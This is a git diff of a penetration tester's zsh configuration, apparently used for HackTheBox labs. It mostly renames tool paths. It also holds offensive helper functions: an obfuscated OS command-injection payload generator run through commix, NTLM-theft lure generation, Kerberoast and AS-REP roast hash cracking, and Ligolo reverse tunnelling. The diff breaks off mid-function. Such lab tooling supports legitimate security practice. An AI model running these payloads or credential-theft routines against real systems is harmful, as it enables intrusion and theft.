@@ -1,10 +1,9 @@
-
 #Program aliases
 alias htb='sudo openvpn /home/damuna/Downloads/lab_Damuna.ovpn'
 alias tunip="ip -o -4 addr show tun0 | awk '{print \$4}' | cut -d'/' -f1"
-alias gettgtpkinit.py="/home/damuna/TOOLS/PKINITtools/venv/bin/python3 /home/damuna/TOOLS/PKINITtools/gettgtpkinit.py"
-alias getnthash.py="/home/damuna/TOOLS/PKINITtools/venv/bin/python3 /home/damuna/TOOLS/PKINITtools/getnthash.py"
-alias pygpoabuse="/home/damuna/TOOLS/pyGPOAbuse/venv/bin/python3 /home/damuna/TOOLS/pyGPOAbuse/pygpoabuse.py"
+alias gettgtpkinit.py="/home/damuna/tools/PKINITtools/venv/bin/python3 /home/damuna/tools/PKINITtools/gettgtpkinit.py"
+alias getnthash.py="/home/damuna/tools/PKINITtools/venv/bin/python3 /home/damuna/tools/PKINITtools/getnthash.py"
+alias pygpoabuse="/home/damuna/tools/pyGPOAbuse/venv/bin/python3 /home/damuna/tools/pyGPOAbuse/pygpoabuse.py"
 alias randstr="openssl rand -hex 12"
 # TTY upgrade
 tty(){
@@ -118,7 +117,7 @@ nscan(){
         sudo ike-scan -M -A --showbackoff --ikev2 $1 -d $2
 
         echo -e "\n[+] SCANNING VIA IKER, SEARCHING VALID ID VALUES\n"
-        sudo python3 /home/damuna/TOOLS/iker.py --fullalgs --clientids /usr/share/seclists/Miscellaneous/ike-groupid.txt -o IKE_AUDIT_$1.txt $1
+        sudo python3 /home/damuna/tools/iker.py --fullalgs --clientids /usr/share/seclists/Miscellaneous/ike-groupid.txt -o IKE_AUDIT_$1.txt $1
 
         read -r ike_id\?"[+] INPUT A VALID IKE-ID VALUE (BLANK TO SKIP): "
         if [[ ! -z $ike_id ]]; then
@@ -304,7 +303,7 @@ nscan(){
         rpcclient -U "Guest" -N $1
 
         echo -e "\nCHECKING IOXID INTERFACES/IPs\n"
-        /home/damuna/TOOLS/IOXIDResolver/venv/bin/python3 ~/TOOLS/IOXIDResolver/IOXIDResolver.py -t $1
+        /home/damuna/tools/IOXIDResolver/venv/bin/python3 ~/tools/IOXIDResolver/IOXIDResolver.py -t $1
     fi
 
     if [[ "$service" == "finger" ]]; then
@@ -375,7 +374,7 @@ nscan(){
                             if [[ -z $axfr_resp ]]; then
                                 echo -e "\n[+] ZONE TRANSFER FAILED, BRUTEFORCING DOMAINS (TOP-110000)\n"
                                 echo $2 > /tmp/ns_$dnsdom.txt
-                                cur=$(pwd) && cd ~/TOOLS/subbrute
+                                cur=$(pwd) && cd ~/tools/subbrute
                                 python2 subbrute.py $dnsdom -s /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -r /tmp/ns_$dnsdom.txt
                                 cd $cur
                             else
@@ -436,7 +435,7 @@ nscan(){
                         done < /tmp/ns_$dnsdom.txt
                         if [[ -z $axfr_resp ]]; then
                             echo -e "\n[+] ZONE TRANSFER FAILED, BRUTEFORCING DOMAINS (TOP-110000)\n"
-                            cur=$(pwd) && cd ~/TOOLS/subbrute
+                            cur=$(pwd) && cd ~/tools/subbrute
                             python2 subbrute.py $dnsdom -s /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -r /tmp/ns_$dnsdom.txt
                             cd $cur
                         fi
@@ -647,7 +646,7 @@ nscan(){
             if [[ -z $wd_pass ]]; then
                 wd_pass="/usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt"
             fi
-            ~/TOOLS/snmpwn/snmpwn.rb -u $wd_user -p $wd_pass --enclist $wd_pass -h $1:$2
+            ~/tools/snmpwn/snmpwn.rb -u $wd_user -p $wd_pass --enclist $wd_pass -h $1:$2
             
             echo ""; read snmp_data\?"INPUT A VALID \"USER:PASS\" COMBINATION (CTRL-C IF NONE): "
             usr=$(echo $snmp_data | cut -d':' -f1)
@@ -779,7 +778,7 @@ crawl(){
         cat /tmp/crawled_$dom.txt | grep -E "\[linkfinder\]" | awk -F" " '{print $6}' | grep -oP '\bhttp[s]?://[^\s]+' --color=never | awk '!seen[$0]++' | grep -v "www.w3.org" | grep -v "reactjs.org" | grep -v "mui.com"
 
         echo -e "\nJS SECRET MINING\n"
-        cat /tmp/js_$dom.txt | while read line; do; /home/damuna/TOOLS/SecretFinder/venv/bin/python3 ~/TOOLS/SecretFinder/SecretFinder.py -i $1 -e -g 'jquery;bootstrap;api.google.com' -o cli | grep -v "twilio_" | grep -v "possible_" | grep -v "google_captcha"; done
+        cat /tmp/js_$dom.txt | while read line; do; /home/damuna/tools/SecretFinder/venv/bin/python3 ~/tools/SecretFinder/SecretFinder.py -i $1 -e -g 'jquery;bootstrap;api.google.com' -o cli | grep -v "twilio_" | grep -v "possible_" | grep -v "google_captcha"; done
 
         echo -e "\nBROKEN LINK 404 HIJACKING\n"
         blc -ro -f -i --filter-level 2 -g $1 | grep -i HTTP_404
@@ -834,16 +833,15 @@ filefuzz(){
         echo -e "TARGET IS VULNERABLE, DISCOVERING PATHS VIA SNS"
         sns -u $1 -s -t 25
     fi
-    echo -e "-----------------FILE FUZZING------------------\n"
     dom=$(echo $1 | unfurl format %d)
     local target=$1
     local cookie=${2:-"rand=rand"}
 
     echo -e "\n----------------RECURSIVE FILE FUZZING---------------------\n"
-    ffuf -H "Cookie: $cookie" -mc all -fc 404,400,503,429,500 -t 10 -ac -acs advanced -r -ic -u $1/FUZZ -c -w /usr/share/seclists/Discovery/Web-Content/filefuzz.txt 
+    ffuf -H "Cookie: $cookie" -mc all -fc 404,400,503,429,500 -t 10 -ac -acs advanced -r -ic -u $1/FUZZ -c -w /home/damuna/wordlists/filefuzz.txt 
     
     echo -e "\n----------------NON RECURSIVE FILE FUZZING---------------------\n"
-    ffuf -H "Cookie: $cookie" -mc all -fc 404,400,503,429,500 -t 10 -ac -acs advanced -ic -u $1/FUZZ -c -w /usr/share/seclists/Discovery/Web-Content/filefuzz.txt 
+    ffuf -H "Cookie: $cookie" -mc all -fc 404,400,503,429,500 -t 10 -ac -acs advanced -ic -u $1/FUZZ -c -w /home/damuna/wordlists/filefuzz.txt 
 
     echo -e "\n--------------------NUCLEI FILE EXPOSURE----------------------------\n"
     nuclei -up &>/dev/null && nuclei -ut &>/dev/null
@@ -855,10 +853,10 @@ extfuzz(){
     select_extension
     echo -e "\n--------------------RECURSIVE EXTENSION FUZZING------------------\n"
     urlgen $1
-    ffuf -H "Cookie: $cookie" -mc all -fc 400,503,429,404,500 -t 10 -ac -acs advanced -r -ic -u $1/FUZZ -c -w /home/damuna/WORDLISTS/combined_words_no_dot.txt -e $ext
+    ffuf -H "Cookie: $cookie" -mc all -fc 400,503,429,404,500 -t 10 -ac -acs advanced -r -ic -u $1/FUZZ -c -w /home/damuna/wordlists/combined_words_no_dot.txt -e $ext
 
     echo -e "\n--------------------NON RECURSIVE EXTENSION FUZZING------------------\n"
-    ffuf -H "Cookie: $cookie" -mc all -fc 400,503,429,404,500 -t 10 -ac -acs advanced -ic -u $1/FUZZ -c -w /home/damuna/WORDLISTS/combined_words_no_dot.txt -e $ext 
+    ffuf -H "Cookie: $cookie" -mc all -fc 400,503,429,404,500 -t 10 -ac -acs advanced -ic -u $1/FUZZ -c -w /home/damuna/wordlists/combined_words_no_dot.txt -e $ext 
 }
 
 # Directory Discovery
@@ -887,9 +885,9 @@ webenum() {
   tmux new-session -d -s "$dom" -n "$1" "source ~/.zshrc; techscan $1; crawl $1; read"
 
   # Add the other panes
-  tmux split-window -h -t "$dom:0.0" "source ~/.zshrc; dirfuzz $1; read"
-  tmux split-window -h -t "$dom:0.1" "source ~/.zshrc; filefuzz $1; read"
-  tmux split-window -v -t "$dom:0.2" "source ~/.zshrc; extfuzz $1; read"
+  tmux split-window -h -t "$dom:0.0" "source ~/.zshrc; dirfuzz $1 $cookie; read"
+  tmux split-window -h -t "$dom:0.1" "source ~/.zshrc; filefuzz $1 $cookie; read"
+  tmux split-window -v -t "$dom:0.2" "source ~/.zshrc; extfuzz $1 $cookie; read"
 
   # Arrange layout
   tmux select-layout -t "$dom" tiled
@@ -902,7 +900,7 @@ webenum() {
 
 apifuzz(){
     echo -e "\nLAUNCHING KITERUNNER ON TARGET\n"
-    kr scan $1/ -w ~/TOOLS/WORDLISTS/routes-large.kite
+    kr scan $1/ -w ~/tools/wordlists/routes-large.kite
 }
 
 bckfile(){
@@ -1044,7 +1042,7 @@ httpservUP(){
     mkdir -p /tmp/https && cd /tmp/https
     
     # Start the server
-    python3 -m uploadserver 443 --server-certificate /tmp/server.pem
+    uploadserver 443 --server-certificate /tmp/server.pem
 }
 
 ftpserv(){
@@ -1248,7 +1246,7 @@ listenping(){
 }
 
 # WINDAPSEARCH
-alias windapsearch='/home/damuna/TOOLS/windapsearch/venv/bin/python3 /home/damuna/TOOLS/windapsearch/windapsearch.py'
+alias windapsearch='/home/damuna/tools/windapsearch/venv/bin/python3 /home/damuna/tools/windapsearch/windapsearch.py'
 
 # web shell path
 webshell(){
@@ -1273,8 +1271,8 @@ dnsrec(){
 ligstart(){
     mkdir -p ./LIGOLO_DATA && cd ./LIGOLO_DATA
     chnic
-    echo "./agent -connect $ip:$1 -ignore-cert"
-    sudo cp ~/TOOLS/LIGOLO_AGENTS/ligolo-ng.yaml .
+    echo "./agent -connect $ip:${1:-11601} -ignore-cert"
+    sudo cp ~/tools/LIGOLO_AGENTS/ligolo-ng.yaml .
     sudo ligolo-proxy -selfcert -laddr "$ip:${1:-11601}"
 }
 
@@ -1513,18 +1511,22 @@ paramscan(){
         if [[ -z $wd ]]; then
             wd=/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
         fi
+    read -r cookie\?"INPUT SESSION COOKIE IF NEEDED (KEY1=VAL1;KEY2=VAL2): "
+    if [[ -z $cookie ]]; then
+        cookie="rand=rand"
+    fi
 
     echo "\nX8 SEARCH (GET/POST)\n"    
-    x8 -u $1 -X GET POST -w $wd
+    x8 -u $1 -H "Cookie: $cookie" -X GET POST -w $wd
 
     echo -e "\nX8 SEARCH (JSON)\n"
-    x8 -u $1 -X POST -w $wd -t json
+    x8 -u $1 -H "Cookie: $cookie" -X POST -w $wd -t json
 }
 
 # Usernames Generation
 usergen(){
     echo -e "\nGENERATING USERNAMES\n"
-    ~/TOOLS/username-anarchy/username-anarchy -i $1 > gen_users.txt
+    ~/tools/username-anarchy/username-anarchy -i $1 > gen_users.txt
 }
 
 # Neo4j server
@@ -1559,7 +1561,6 @@ krbconf(){
 
     echo -e "\n[+] SYNCING TIME WITH DC \"$1\"\n"
     sudo timedatectl set-ntp off
-    timeout 1 sudo ntpdate -s $1
     timeout 1 sudo rdate -n $1
 
     echo -e "\n[+] ADDING AD REALM FOR \"$1\"\n"
@@ -1671,11 +1672,15 @@ urlgen(){
     cewl $1 -d 3 -m 3 --lowercase -w /tmp/endpoints_$(echo $1 | unfurl format %d).txt
 }
 
-alias bashfuscator='source ~/TOOLS/bashfuscator-env/bin/activate && bashfuscator'
+alias bashfuscator='source ~/tools/bashfuscator-env/bin/activate && bashfuscator'
 
 
 # OS Injection Request Scanner
 osscan(){
+    if [[ $# -eq 0 ]]; then
+        echo "Usage: osscan <request_file> -> Add FUZZ to parameter to test"
+	return 1
+    fi
     rm ./os_injection.txt
     read -r cmd\?"INPUT COMMAND TO EXECUTE: "
     read -r regex\?"INPUT RESPONSE CONFIRMATION STRING (BLANK IF BLIND): "
@@ -1688,8 +1693,8 @@ osscan(){
 
     while read rev; do
         revstr="$rev<<<'$(echo "$cmd" | rev)'"
-        echo "\$($revstr)" >> ~/WORDLISTS/OS_INJECTION/payloads.txt
-        echo "\`$revstr\`" >> ~/WORDLISTS/OS_INJECTION/payloads.txt
+        echo "\$($revstr)" >> ~/wordlists/OS_INJECTION/payloads.txt
+        echo "\`$revstr\`" >> ~/wordlists/OS_INJECTION/payloads.txt
     done < /tmp/rev_mangle.txt
     rm /tmp/rev_mangle.txt
 
@@ -1699,9 +1704,9 @@ osscan(){
     echo "xxd" | sed "s/./&\"\"/1" >> /tmp/xxd_mangle.txt
     echo "\$(rev<<<xxd)" >> /tmp/xxd_mangle.txt
     while read xxd; do
-        echo "\$($xxd -r -ps<<<$(echo -n "$cmd" | hexdump -ve '/1 "%02x"'))" >> ~/WORDLISTS/OS_INJECTION/payloads.txt
-        echo "\`$xxd -r -ps<<<$(echo -n "$cmd" | hexdump -ve '/1 "%02x"')\`" >> ~/WORDLISTS/OS_INJECTION/payloads.txt
-        echo "{$xxd,-r,-ps,<<<,$(echo -n "$cmd" | hexdump -ve '/1 "%02x"')}" >> ~/WORDLISTS/OS_INJECTION/payloads.txt
+        echo "\$($xxd -r -ps<<<$(echo -n "$cmd" | hexdump -ve '/1 "%02x"'))" >> ~/wordlists/OS_INJECTION/payloads.txt
+        echo "\`$xxd -r -ps<<<$(echo -n "$cmd" | hexdump -ve '/1 "%02x"')\`" >> ~/wordlists/OS_INJECTION/payloads.txt
+        echo "{$xxd,-r,-ps,<<<,$(echo -n "$cmd" | hexdump -ve '/1 "%02x"')}" >> ~/wordlists/OS_INJECTION/payloads.txt
     done < /tmp/xxd_mangle.txt
     rm /tmp/xxd_mangle.txt
 
@@ -1710,27 +1715,27 @@ osscan(){
     echo "$cmd" | sed "s/./&\'\'/1" >> /tmp/cmd_mangle.txt
     echo "$cmd" | sed "s/./&\"\"/1" >> /tmp/cmd_mangle.txt
     while read cmdp; do
-        echo "$cmdp" >> ~/WORDLISTS/OS_INJECTION/payloads.txt
-        echo "\$($cmdp)" >> ~/WORDLISTS/OS_INJECTION/payloads.txt
-        echo "\`$cmdp\`" >> ~/WORDLISTS/OS_INJECTION/payloads.txt
-        echo "{$(echo $cmdp | sed -e "s/ /,/g")}" >> ~/WORDLISTS/OS_INJECTION/payloads.txt
+        echo "$cmdp" >> ~/wordlists/OS_INJECTION/payloads.txt
+        echo "\$($cmdp)" >> ~/wordlists/OS_INJECTION/payloads.txt
+        echo "\`$cmdp\`" >> ~/wordlists/OS_INJECTION/payloads.txt
+        echo "{$(echo $cmdp | sed -e "s/ /,/g")}" >> ~/wordlists/OS_INJECTION/payloads.txt
     done < /tmp/cmd_mangle.txt
     rm /tmp/cmd_mangle.txt
 
     while read sp; do
-        cat ~/WORDLISTS/OS_INJECTION/payloads.txt | sed "s/ /$sp/g" >> ~/WORDLISTS/OS_INJECTION/payloads.txt
-    done < ~/WORDLISTS/OS_INJECTION/spaces.txt
-    cat ~/WORDLISTS/OS_INJECTION/payloads.txt | sed -e "s/\//\$\{PATH:0:1\}/g" >> ~/WORDLISTS/OS_INJECTION/payloads.txt
+        cat ~/wordlists/OS_INJECTION/payloads.txt | sed "s/ /$sp/g" >> ~/wordlists/OS_INJECTION/payloads.txt
+    done < ~/wordlists/OS_INJECTION/spaces.txt
+    cat ~/wordlists/OS_INJECTION/payloads.txt | sed -e "s/\//\$\{PATH:0:1\}/g" >> ~/wordlists/OS_INJECTION/payloads.txt
 
     while read sp; do
         while read sep; do
             while read payload; do
                 echo "$sp$sep$sp$payload" >> os_injection.txt
                 echo "$sp$sep$sp$payload$sp#" >> os_injection.txt
-            done < ~/WORDLISTS/OS_INJECTION/payloads.txt
-        done < ~/WORDLISTS/OS_INJECTION/separators.txt
-    done < ~/WORDLISTS/OS_INJECTION/spaces.txt
-    rm ~/WORDLISTS/OS_INJECTION/payloads.txt
+            done < ~/wordlists/OS_INJECTION/payloads.txt
+        done < ~/wordlists/OS_INJECTION/separators.txt
+    done < ~/wordlists/OS_INJECTION/spaces.txt
+    rm ~/wordlists/OS_INJECTION/payloads.txt
     
     cat os_injection.txt | sort -u | shuf >t; mv t os_injection.txt
     if [[ ! -z $regex ]]; then
@@ -1743,12 +1748,13 @@ osscan(){
 
     echo -e "\nTESTING REQUEST \"$1\" FOR OS INJECTION USING COMMIX"
     cur=$(pwd)
-    cd ~/TOOLS/commix
+    cd ~/tools/commix
     python3 commix.py --update
     python3 commix.py -r $cur/$1 --flush-session --mobile --purge --current-user --level=3 --tamper=backslashes,backticks,base64encode,caret,dollaratsigns,doublequotes,multiplespaces,nested,printf2echo,randomcase,rev,singlequotes,slash2env,sleep2timeout,sleep2usleep,space2htab,space2ifs,space2plus,space2vtab
     cd $cur
 }
 
+# python virtual environment
 pyenv() {
     echo -e "\nSPAWNING VIRTUAL PYTHON3 ENVIRONMENT\n"
     python3 -m venv venv
@@ -1780,6 +1786,40 @@ pyenv() {
     fi
 }
 
+pyenv2() {
+    echo -e "\nSPAWNING VIRTUAL PYTHON2.7 ENVIRONMENT\n"
+
+    # Create the environment explicitly using python2.7
+    virtualenv -p python2.7 venv
+    source venv/bin/activate
+
+    if [[ -f ./requirements.txt ]]; then
+        # Use 'python -m pip' to ensure we use the venv's pip
+        python -m pip install -r requirements.txt
+    fi
+
+    # Ask if the user wants to create an alias
+    echo -n "Do you want to create a shell alias for this project? (y/N): "
+    read CREATE_ALIAS
+
+    if [[ "$CREATE_ALIAS" =~ ^[Yy]$ ]]; then
+        # In a Python 2 venv, the binary is usually named 'python', not 'python3'
+        PY_BIN="$(which python)" 
+        PROJECT_DIR="$(pwd)"
+        TOOL_NAME="$(basename "$PROJECT_DIR")"
+
+        # Ask which script should be the entrypoint
+        echo -n "Enter script filename to run [default: main.py]: "
+        read SCRIPT_NAME
+        SCRIPT_NAME="${SCRIPT_NAME:-main.py}"
+
+        # Create alias in .zshrc
+        echo "alias ${TOOL_NAME}='${PY_BIN} ${PROJECT_DIR}/${SCRIPT_NAME}'" >> ~/.zshrc
+        echo "✅ Alias '${TOOL_NAME}' added. Run 'source ~/.zshrc' to use it."
+    else
+        echo "Skipping alias creation."
+    fi
+}
 
 #Responder Server
 respond(){
@@ -1789,8 +1829,8 @@ respond(){
 
 # LLMNR File Generator
 ntlmtheft(){
-    cd /home/damuna/TOOLS/ntlm_theft
-    rm -rf /home/damuna/TOOLS/ntlm_theft/NTDOCS
+    cd /home/damuna/tools/ntlm_theft
+    rm -rf /home/damuna/tools/ntlm_theft/NTDOCS
     python3 ntlm_theft.py -g all -s $1 -f NTDOCS
 }
 
@@ -2142,7 +2182,7 @@ smbmount() {
 # Hashcat cracking
 hashcrack() {
     local hash_file="$1"
-    local wordlist="${2:-$HOME/WORDLISTS/rockyou.txt}"
+    local wordlist="${2:-$HOME/wordlists/rockyou.txt}"
 
     # --- 1. Validate inputs ---
     if [[ -z "$hash_file" ]]; then
@@ -2160,7 +2200,7 @@ hashcrack() {
     fi
 
     # --- PHASE 1: Get all suggested modes and store them in an array ---
-    echo "[*] Getting hash mode suggestions from hashcat..."
+    echo "[*] Getting hash mode suggestions or cracking directly using hashcat..."
     local suggested_modes_string
     # We run hashcat once just to get the suggestions.
     suggested_modes_string=$(hashcat "$hash_file" "$wordlist" 2>&1 | grep -oE '^[[:space:]]*[0-9]+' | tr -d ' ' | paste -sd ' ' -)
@@ -2181,7 +2221,6 @@ hashcrack() {
 
 
     echo "[*] Found suggested hash modes to try: ${modes_array[*]}"
-
     # --- PHASE 2: Iterate through the array and run hashcat for each mode ---
     for mode in "${modes_array[@]}"; do
         echo
@@ -2189,7 +2228,7 @@ hashcrack() {
         echo "[*] Trying hash mode: $mode"
         echo "============================================================"
 
-        hashcat -m "$mode" "$hash_file" "$wordlist" --force
+        /home/damuna/tools/HASHCAT/hashcat-7.1.2/hashcat.bin -m "$mode" "$hash_file" "$wordlist" --force
 
         # Check for cracked hashes after the run is complete.
         local cracked
@@ -2338,7 +2377,7 @@ domdump(){
     if [[ -z $2 ]]; then
         read -r usr_kb\?"[+] BRUTEFORCING MODE DETECTED, INPUT USER WORDLIST (DEFAULT: top-formats.txt): "
         if [[ -z $usr_kb ]]; then
-            usr_kb="/home/kali/WORDLISTS/STATISTICALLY_LIKELY/top-formats.txt"
+            usr_kb="/home/kali/wordlists/STATISTICALLY_LIKELY/top-formats.txt"
         fi
         dombrute $1 $usr_kb
         return 1
@@ -2758,7 +2797,7 @@ timeroast(){
     echo -e "\n[+] CRACKING NTP HASHES USING \"/usr/share/wordlists/rockyou.txt\"\n"
     nxc smb $1 -M timeroast | grep sntp-ms | awk '{print $5}' | awk -F":" '{print $2}' > NTP_RAW_$1.txt
     if [[ -s NTP_RAW_$1.txt ]]; then
-        ~/TOOLS/HASHCAT/hashcat-7.1.2/hashcat.bin NTP_RAW_$1.txt -m 31300 -a 0 -O -w 4 --quiet /usr/share/wordlists/rockyou.txt --outfile ntp_cracked.txt
+        ~/tools/HASHCAT/hashcat-7.1.2/hashcat.bin NTP_RAW_$1.txt -m 31300 -a 0 -O -w 4 --quiet /usr/share/wordlists/rockyou.txt --outfile ntp_cracked.txt
     fi
 }
 
@@ -2773,7 +2812,7 @@ kbroast(){
     fi
     if [[ -s KB_RAW_$1.txt ]]; then
         echo -e "\n[+] CRAKING KB HASHES USING \"/usr/share/wordlists/rockyou.txt\"\n"
-        ~/TOOLS/HASHCAT/hashcat-7.1.2/hashcat.bin -m 13100 KB_RAW_$1.txt -a 0 -O -w 4 /usr/share/wordlists/rockyou.txt --quiet --outfile kb_cracked.txt
+        ~/tools/HASHCAT/hashcat-7.1.2/hashcat.bin -m 13100 KB_RAW_$1.txt -a 0 -O -w 4 /usr/share/wordlists/rockyou.txt --quiet --outfile kb_cracked.txt
     fi
 }
 
@@ -2793,7 +2832,7 @@ asreproast(){
 
     if [[ -s ASREP_RAW_$1.txt ]]; then
         echo -e "\n[+] CRAKING ASREP HASHES USING \"/usr/share/wordlists/rockyou.txt\"\n"
-        ~/TOOLS/HASHCAT/hashcat-7.1.2/hashcat.bin -m 18200 -a 0 -O -w 4 /usr/share/wordlists/rockyou.txt --outfile asrep_cracked.txt
+        ~/tools/HASHCAT/hashcat-7.1.2/hashcat.bin -m 18200 -a 0 -O -w 4 /usr/share/wordlists/rockyou.txt --outfile asrep_cracked.txt
 
         echo -e "\n[+] SEARCHING BLIND KB ROASTING USERS\n"
         if [[ -z $3 ]]; then
@@ -2810,7 +2849,7 @@ asreproast(){
 
         if [[ -s BLIND_KB_RAW_$1.txt ]]; then
             echo -e "\n[+] CRACKING BLIND KB HASHES USING \"/usr/share/wordlists/rockyou.txt\"\n"
-            ~/TOOLS/HASHCAT/hashcat-7.1.2/hashcat.bin BLIND_KB_RAW_$1.txt -m 13100 -a 0 -O -w 4 /usr/share/wordlists/rockyou.txt --oufile blind_kb_cracked.txt
+            ~/tools/HASHCAT/hashcat-7.1.2/hashcat.bin BLIND_KB_RAW_$1.txt -m 13100 -a 0 -O -w 4 /usr/share/wordlists/rockyou.txt --oufile blind_kb_cracked.txt
         fi
     fi
 }
@@ -2819,4 +2858,333 @@ kbload(){
     echo -e "\n[+] LOADED TICKET \"$1\"\n"
     export KRB5CCNAME=$1
     klist
+}
+
+generate_web_paths() {
+    if [[ $# -eq 0 ]]; then
+        echo "Usage: generate_web_paths <server_type> [domain] [output_file]"
+        echo "Supported servers: apache, nginx, lighttpd, tomcat, iis, caddy, all"
+        return 1
+    fi
+    
+    local server_type="$1"
+    local domain="${2:-}"
+    local output_file="${3:-web_paths.txt}"
+    
+    # Clear or create the output file
+    > "$output_file"
+    
+    # Base directories
+    local bases=("/usr/local/etc" "/etc" "/opt" "/usr/local")
+    
+    case "$server_type" in
+        apache)
+            {
+            local apache_dirs=("httpd" "apache" "apache2" "apache24")
+            local main_configs=("httpd.conf" "apache2.conf" "ports.conf")
+            local site_configs=("000-default.conf" "default.conf" "default-ssl.conf")
+            
+            # Add domain-specific configs if domain provided
+            if [[ -n "$domain" ]]; then
+                site_configs+=("${domain}.conf" "ssl-${domain}.conf" "${domain}-ssl.conf" "vhost-${domain}.conf")
+            fi
+            
+            for base in "${bases[@]}"; do
+                for apache_dir in "${apache_dirs[@]}"; do
+                    # Main configuration files
+                    for config in "${main_configs[@]}"; do
+                        echo "${base}/${apache_dir}/conf/${config}"
+                        echo "${base}/${apache_dir}/${config}"
+                    done
+                    
+                    # Virtual host directories
+                    echo "${base}/${apache_dir}/conf/vhosts/"
+                    echo "${base}/${apache_dir}/conf/vhosts.d/"
+                    echo "${base}/${apache_dir}/conf/extra/"
+                    echo "${base}/${apache_dir}/conf/extra/httpd-vhosts.conf"
+                    echo "${base}/${apache_dir}/vhosts/"
+                    
+                    # Sites configurations
+                    for site_config in "${site_configs[@]}"; do
+                        echo "${base}/${apache_dir}/conf/sites-enabled/${site_config}"
+                        echo "${base}/${apache_dir}/conf/sites-available/${site_config}"
+                        echo "${base}/${apache_dir}/sites-enabled/${site_config}"
+                        echo "${base}/${apache_dir}/sites-available/${site_config}"
+                    done
+                    
+                    # Log files (only if domain provided for targeted approach)
+                    if [[ -n "$domain" ]]; then
+                        echo "${base}/${apache_dir}/logs/access_log"
+                        echo "${base}/${apache_dir}/logs/error_log"
+                        echo "/var/log/${apache_dir}/access.log"
+                        echo "/var/log/${apache_dir}/error.log"
+                    fi
+                done
+            done
+            
+            # Common Apache paths
+            echo "/var/www/html/"
+            if [[ -n "$domain" ]]; then
+                echo "/var/www/${domain}/"
+                echo "/home/*/public_html/${domain}/"
+            else
+                echo "/var/www/"
+            fi
+            echo "/srv/http/"
+            echo "/home/*/public_html/"
+            } >> "$output_file"
+            ;;
+        
+        nginx)
+            {
+            local main_configs=("nginx.conf")
+            local site_configs=("default" "default.conf" "default_ssl")
+            
+            # Add domain-specific configs if domain provided
+            if [[ -n "$domain" ]]; then
+                site_configs+=("${domain}" "${domain}.conf" "ssl-${domain}.conf" "${domain}-le-ssl.conf")
+            fi
+            
+            for base in "${bases[@]}"; do
+                # Main configuration files
+                for config in "${main_configs[@]}"; do
+                    echo "${base}/nginx/${config}"
+                    echo "${base}/nginx/conf/${config}"
+                done
+                
+                # Configuration directories
+                echo "${base}/nginx/conf.d/"
+                echo "${base}/nginx/vhosts/"
+                
+                # Sites configurations
+                for site_config in "${site_configs[@]}"; do
+                    echo "${base}/nginx/sites-enabled/${site_config}"
+                    echo "${base}/nginx/sites-available/${site_config}"
+                    echo "${base}/nginx/conf.d/${site_config}"
+                    echo "${base}/nginx/vhosts/${site_config}"
+                done
+            done
+            
+            # Additional common Nginx paths
+            echo "/opt/nginx/conf/nginx.conf"
+            echo "/opt/nginx/conf.d/"
+            if [[ -n "$domain" ]]; then
+                echo "/var/log/nginx/${domain}.access.log"
+                echo "/var/log/nginx/${domain}.error.log"
+                echo "/var/www/${domain}/"
+            else
+                echo "/var/log/nginx/access.log"
+                echo "/var/log/nginx/error.log"
+            fi
+            echo "/usr/share/nginx/html/"
+            echo "/srv/http/"
+            } >> "$output_file"
+            ;;
+        
+        lighttpd)
+            {
+            local lighttpd_configs=("lighttpd.conf")
+            local vhost_configs=("simple-vhost.conf" "evhost.conf")
+            
+            # Add domain-specific configs if domain provided
+            if [[ -n "$domain" ]]; then
+                vhost_configs+=("${domain}.conf")
+            fi
+            
+            for base in "${bases[@]}"; do
+                for config in "${lighttpd_configs[@]}"; do
+                    echo "${base}/lighttpd/${config}"
+                    echo "${base}/lighttpd/conf-available/${config}"
+                done
+                
+                # Vhost configurations
+                for vhost_config in "${vhost_configs[@]}"; do
+                    echo "${base}/lighttpd/conf-available/${vhost_config}"
+                    echo "${base}/lighttpd/conf-enabled/${vhost_config}"
+                    echo "${base}/lighttpd/vhosts/${vhost_config}"
+                done
+                
+                echo "${base}/lighttpd/vhosts.d/"
+            done
+            
+            # Common Lighttpd paths
+            if [[ -n "$domain" ]]; then
+                echo "/var/log/lighttpd/${domain}.access.log"
+                echo "/var/www/${domain}/"
+            else
+                echo "/var/log/lighttpd/access.log"
+                echo "/var/www/"
+            fi
+            echo "/srv/http/"
+            } >> "$output_file"
+            ;;
+        
+        tomcat)
+            {
+            local tomcat_dirs=("tomcat" "tomcat9" "tomcat8" "tomcat7" "tomcat85")
+            local tomcat_configs=("server.xml" "web.xml" "context.xml")
+            
+            for base in "${bases[@]}"; do
+                for tomcat_dir in "${tomcat_dirs[@]}"; do
+                    for config in "${tomcat_configs[@]}"; do
+                        echo "${base}/${tomcat_dir}/${config}"
+                        echo "${base}/${tomcat_dir}/conf/${config}"
+                    done
+                    
+                    # Virtual host and app directories
+                    echo "${base}/${tomcat_dir}/conf/Catalina/"
+                    echo "${base}/${tomcat_dir}/conf/Catalina/localhost/"
+                    echo "${base}/${tomcat_dir}/webapps/"
+                    
+                    # Domain-specific if provided
+                    if [[ -n "$domain" ]]; then
+                        echo "${base}/${tomcat_dir}/conf/Catalina/localhost/${domain}.xml"
+                        echo "${base}/${tomcat_dir}/webapps/${domain}/"
+                        echo "${base}/${tomcat_dir}/webapps/${domain}/WEB-INF/web.xml"
+                        echo "${base}/${tomcat_dir}/logs/${domain}.log"
+                    else
+                        echo "${base}/${tomcat_dir}/conf/Catalina/localhost/"
+                        echo "${base}/${tomcat_dir}/webapps/"
+                    fi
+                done
+            done
+            
+            # Common Tomcat paths
+            echo "/opt/tomcat/conf/server.xml"
+            if [[ -n "$domain" ]]; then
+                echo "/var/log/tomcat*/${domain}.log"
+            else
+                echo "/var/log/tomcat*/catalina.out"
+            fi
+            echo "/var/lib/tomcat*/webapps/"
+            } >> "$output_file"
+            ;;
+        
+        iis)
+            {
+            # Windows paths
+            echo "C:\\Windows\\System32\\inetsrv\\config\\applicationHost.config"
+            echo "C:\\Windows\\System32\\inetsrv\\config\\schema\\"
+            echo "C:\\inetpub\\wwwroot\\web.config"
+            echo "C:\\inetpub\\logs\\LogFiles\\"
+            
+            if [[ -n "$domain" ]]; then
+                echo "C:\\inetpub\\vhosts\\${domain}\\"
+                echo "C:\\inetpub\\vhosts\\${domain}\\web.config"
+                echo "C:\\inetpub\\wwwroot\\${domain}\\"
+                echo "C:\\inetpub\\wwwroot\\${domain}\\web.config"
+                echo "C:\\inetpub\\logs\\LogFiles\\W3SVC*\\${domain}.log"
+            else
